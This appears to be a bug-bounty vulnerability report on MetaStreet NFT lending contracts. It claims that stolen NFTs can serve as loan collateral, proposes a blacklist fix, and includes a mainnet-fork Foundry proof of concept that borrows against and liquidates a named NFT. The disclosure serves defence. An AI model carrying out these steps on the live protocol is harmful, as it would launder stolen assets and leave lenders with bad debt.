# NFT thieves can abuse MetaStreet to make profit by borrowing funds with stolen NFT as collateral.

## Bug Description
Major NFT marketplaces like OpenSea or Blur do not allow stolen NFTs to be traded.

But there's not mechanism to block stolen NFTs to be used as collateral.

https://github.com/metastreet-labs/metastreet-contracts-v2/blob/master/contracts/filters/CollectionCollateralFilter.sol#L59-L66
```solidity
    function _collateralSupported(
        address token,
        uint256,
        uint256,
        bytes calldata
    ) internal view override returns (bool) {
        return token == _token;
    }
```

A NFT thieves can borrow funds from MetaStreet to generate profit at the expense of the shareholders who are not aware of collateral's status.

Of course NFT thieves will not repay, liquidation will be started.

If community is aware of the status of NFT, there will be no bidders.

If community is not aware, there will be a bidding, but liquidation winner will get useless NFT.

## Impact
- MetaStreet can be used as a money laundering machine.

- Shareholder values will be affected by bad debt.

- Liquidation winner will get stolen NFT which is not usable in major platforms.

## Risk Breakdown
Difficulty to Exploit: Medium
Weakness: High
CVSS2 Score: 8

## Recommendation
`CollectionCollateralFilter.sol` should check if token id is in blacklist or not.

```solidity
+    mapping (uint256 => bool) public blacklist;

    function _collateralSupported(
        address token,
        uint256 tokenId,
        uint256,
        bytes calldata
    ) internal view override returns (bool) {
+       return token == _token && blacklist[tokenId] == false;
    }
```

It should also check collateral's status before liquidations starts.

https://github.com/metastreet-labs/metastreet-contracts-v2/blob/master/contracts/Pool.sol#L1086
```solidity
    function liquidate(bytes calldata encodedLoanReceipt) external nonReentrant {
        /* Compute loan receipt hash */
        bytes32 loanReceiptHash = LoanReceipt.hash(encodedLoanReceipt);

        /* Validate loan status is active */
        if (_loans[loanReceiptHash] != LoanStatus.Active) revert InvalidLoanReceipt();

+        for (uint256 i; i < collateralTokenIds.length; i++) {
+            if (!_collateralSupported(collateralToken, collateralTokenIds[i], i, collateralFilterContext))
+                revert UnsupportedCollateral(i);
+        }
        ...
    }
```

## Proof of Concept
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/interfaces/interface.sol";

interface IPoolFactory {
    function create(address poolImpl, bytes calldata params) external returns (address);

    function createProxied(address poolImpl, bytes calldata params) external returns (address);

    function owner() external view returns (address);
    
    function addPoolImplementation(address impl) external;
}

interface IPool {
	function deposit(uint128 tick, uint256 amount, uint256 minShares) external returns (uint256 shares);

	function borrow(
        uint256 principal,
        uint64 duration,
        address collateralToken,
        uint256 collateralTokenId,
        uint256 maxRepayment,
        uint128[] calldata ticks,
        bytes calldata options
    ) external returns (uint256);

	function liquidate(bytes calldata encodedLoanReceipt) external;

    function repay(bytes calldata encodedLoanReceipt) external returns (uint256);

    function redeem(uint128 tick, uint256 shares) external;

    function withdraw(uint128 tick) external returns (uint256, uint256);
}

interface IEnglishAuctionCollateralLiquidator {
	function bid(address collateralToken, uint256 collateralTokenId, uint256 amount) external;

    function claim(
        address collateralToken,
        uint256 collateralTokenId,
        bytes calldata liquidationContext
    ) external;
}
interface IBUSD is IERC20 {
    function assetProtectionRole() external returns (address);
    function freeze(address _addr) external;
}

IPoolFactory	constant factory = IPoolFactory(0x1c91c822F6C5e117A2abe2B33B0E64b850e67095);
address			constant poolImpl = 0x200927A3FDf2A1F67749385230dc7769e00308aA;
IEnglishAuctionCollateralLiquidator constant liquidator = IEnglishAuctionCollateralLiquidator(0xE0194F47040E2424b8a65cB5F7112a5DBE1F93Bf);
IBUSD  constant busd = IBUSD(0x4Fabb145d64652a948d72533023f6E7A623C7C53);
address constant depositor =  0x57D1974a8CA59146D91Dd8C5172110e5a390C048;
address constant bidder =  depositor;
address constant bidder2 =  0x12ED7f6ed0491678764c2b222A58452926E44DB6;
address constant borrower =  0x9773cc2b33C0791D1f35a93f6b895c6Ede1feb54;
address constant borrower2 = 0xB8B6910ed0cf70F92C9a6327838dad479302e7Ad;
address constant coolCats =  0x1A92f7381B9F03921564a437210bB9396471050C;
uint256 constant coolCatsId = 5827;
uint256 constant coolCatsId2 = 5118;

contract MetaStreetTest is Test {

    IPool       pool;

    function setUp() public {
        cheats.createSelectFork("mainnet");

        cheats.label(address(factory), "Factory");
        cheats.label(address(liquidator), "Liquidator");
        cheats.label(address(busd), "BUSD");

        uint64[] memory durations = new uint64[](1);
        uint64[] memory rates = new uint64[](1);

        durations[0] = 1 days;
        rates[0] = 3170979198;

        console.log("New pool created with BUSD...");
		pool = IPool(factory.createProxied(poolImpl, abi.encode(coolCats, busd, durations, rates)));
        cheats.label(address(pool), "Pool");
    }

    function testMetaStreetMoneyLaundering() external {
        uint128 tick = 1e26 << 8;
        uint128[] memory ticks = new uint128[](1);
        ticks[0] = tick;

        console.log("Step 1: Depositing...");
        cheats.startPrank(depositor);
        busd.approve(address(pool), type(uint256).max);
		pool.deposit(tick, 5 ether, 0);

        console.log("Step 2: Borrowing against stolen NFT...");
        cheats.startPrank(borrower);
        IERC721(coolCats).approve(address(pool), coolCatsId);

        cheats.recordLogs();
		pool.borrow(4 ether, 1 days, coolCats, coolCatsId, 5 ether, ticks, bytes(""));
        CheatCodes.Log[] memory entries = cheats.getRecordedLogs();
        bytes memory encodedLoanReceipt = abi.decode(entries[entries.length - 1].data, (bytes));

        console.log("Step 3: Liquidating...");
        cheats.warp(block.timestamp + 2 days);
		cheats.startPrank(depositor);
		pool.liquidate(encodedLoanReceipt);

        console.log("Step 3.1: Bidding...");
        busd.approve(address(liquidator), type(uint256).max);
		liquidator.bid(coolCats, coolCatsId, 6 ether);

        console.log("Step 3.3 Successful bidder will get stolen NFTs as a result.");
        cheats.warp(block.timestamp + 2 days);
		cheats.startPrank(bidder);
		cheats.expectRevert();
        liquidator.claim(coolCats, coolCatsId, encodedLoanReceipt);
    }
}
```